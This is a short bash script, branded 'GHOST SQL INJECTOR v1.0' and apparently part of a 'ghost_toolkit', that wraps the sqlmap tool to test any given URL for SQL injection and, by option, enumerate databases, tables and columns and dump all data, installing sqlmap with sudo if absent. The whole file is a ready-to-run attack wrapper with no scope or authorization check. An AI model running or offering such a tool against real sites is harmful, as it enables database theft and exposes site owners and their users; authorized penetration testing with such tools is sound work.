#!/bin/bash

TARGET=""
LEVEL=1
RISK=1
DBS=false
TABLES=false
COLS=false
DUMP=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target) TARGET="$2"; shift 2 ;;
        -l|--level) LEVEL="$2"; shift 2 ;;
        -r|--risk) RISK="$2"; shift 2 ;;
        --dbs) DBS=true; shift ;;
        --tables) TABLES=true; shift ;;
        --columns) COLS=true; shift ;;
        --dump) DUMP=true; shift ;;
        -h|--help)
            echo "Usage: $0 -t <url> [options]"
            echo ""
            echo "Options:"
            echo "  -t, --target <url>      Target URL"
            echo "  -l, --level <1-5>       Scan level (default: 1)"
            echo "  -r, --risk <1-3>        Risk level (default: 1)"
            echo "  --dbs                   Enumerate databases"
            echo "  --tables                Enumerate tables"
            echo "  --columns               Enumerate columns"
            echo "  --dump                  Dump data"
            echo "  -h, --help              Show this help"
            exit 0 ;;
        *) shift ;;
    esac
done

[ -z "$TARGET" ] && { echo "[!] Target URL required"; exit 1; }

mkdir -p ~/ghost_toolkit/scans

echo "======================================"
echo "     GHOST SQL INJECTOR v1.0          "
echo "======================================"
echo "[*] Target: $TARGET"
echo "[*] Level: $LEVEL, Risk: $RISK"
echo ""

OPTS="--level=$LEVEL --risk=$RISK --batch --smart"
$DBS && OPTS="$OPTS --dbs"
$TABLES && OPTS="$OPTS --tables"
$COLS && OPTS="$OPTS --columns"
$DUMP && OPTS="$OPTS --dump-all"

if command -v sqlmap &> /dev/null; then
    sqlmap -u "$TARGET" $OPTS --output-dir=~/ghost_toolkit/scans/sqlmap_$(date +%Y%m%d_%H%M%S)
else
    echo "[!] sqlmap not found!"
    echo "[*] Installing sqlmap..."
    sudo apt install -y sqlmap
    sqlmap -u "$TARGET" $OPTS --output-dir=~/ghost_toolkit/scans/sqlmap_$(date +%Y%m%d_%H%M%S)
fi

echo ""
echo "[+] Scan complete!"
